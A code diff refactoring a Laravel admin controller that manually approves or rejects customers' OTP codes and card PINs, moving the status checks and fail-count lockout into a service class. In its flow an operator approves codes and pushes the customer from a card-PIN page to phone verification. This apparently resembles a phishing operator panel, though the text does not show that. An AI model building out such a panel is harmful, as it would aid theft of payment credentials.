@@ -8,8 +8,8 @@ use App\Events\PinApproved;
 use App\Events\PinRejected;
 use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
 use App\Http\Controllers\Controller;
-use App\Models\CustomerProfile;
 use App\Models\OtpCode;
+use App\Services\OtpStateService;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
@@ -19,6 +19,10 @@ class AdminOtpController extends Controller
 {
     use NotifiesDashboard;
 
+    public function __construct(
+        private readonly OtpStateService $otpState,
+    ) {}
+
     /**
      * Approve an OTP
      */
@@ -27,37 +31,18 @@ class AdminOtpController extends Controller
         // Atomic check-then-update to prevent race conditions
         [$otp, $earlyResponse] = DB::transaction(function () use ($id) {
             $otp = OtpCode::lockForUpdate()->findOrFail($id);
+            $result = $this->otpState->approve($otp);
 
-            if ($otp->status !== 'pending') {
-                return [$otp, response()->json([
-                    'success' => false,
-                    'message' => 'هذا الرمز تم معالجته مسبقاً',
-                ], 422)];
-            }
-
-            if ($otp->isExpired()) {
-                $otp->reject('otp_expired');
-                return [$otp, response()->json([
-                    'success' => false,
-                    'message' => 'انتهت صلاحية رمز التحقق',
-                    'expired' => true,
-                ], 422)];
-            }
-
-            $otp->verify();
-
-            // Reset fail count on successful approval
-            if ($otp->customer) {
-                $updateData = [
-                    'otp_fail_count'   => 0,
-                    'otp_locked_until' => null,
-                ];
-                if ($otp->type === 'otp') {
-                    $updateData['current_page'] = '/insurance/card-pin';
-                } elseif ($otp->type === 'pin') {
-                    $updateData['current_page'] = '/insurance/phone-verification';
+            if (! $result['success']) {
+                $msg = match ($result['error']) {
+                    'expired' => 'انتهت صلاحية رمز التحقق',
+                    default   => 'هذا الرمز تم معالجته مسبقاً',
+                };
+                $payload = ['success' => false, 'message' => $msg];
+                if ($result['error'] === 'expired') {
+                    $payload['expired'] = true;
                 }
-                $otp->customer->update($updateData);
+                return [$otp, response()->json($payload, 422)];
             }
 
             return [$otp, null];
@@ -112,24 +97,13 @@ class AdminOtpController extends Controller
         // Atomic check-then-update — same pattern as approve() to prevent race on otp_fail_count
         [$otp, $earlyResponse] = DB::transaction(function () use ($id, $reason) {
             $otp = OtpCode::lockForUpdate()->findOrFail($id);
+            $result = $this->otpState->reject($otp, $reason);
 
-            if ($otp->status !== 'pending') {
+            if (! $result['success']) {
                 return [$otp, response()->json([
                     'success' => false,
                     'message' => 'هذا الرمز تم معالجته مسبقاً',
                 ], 422)];
-            }
-
-            $otp->reject($reason);
-
-            // Increment fail count + lockout after 10 consecutive failures
-            if ($otp->customer) {
-                $fails = $otp->customer->otp_fail_count + 1;
-                $lockUntil = $fails >= 10 ? now()->addMinutes(10) : null;
-                $otp->customer->update([
-                    'otp_fail_count'   => $fails,
-                    'otp_locked_until' => $lockUntil,
-                ]);
             }
 
             return [$otp, null];
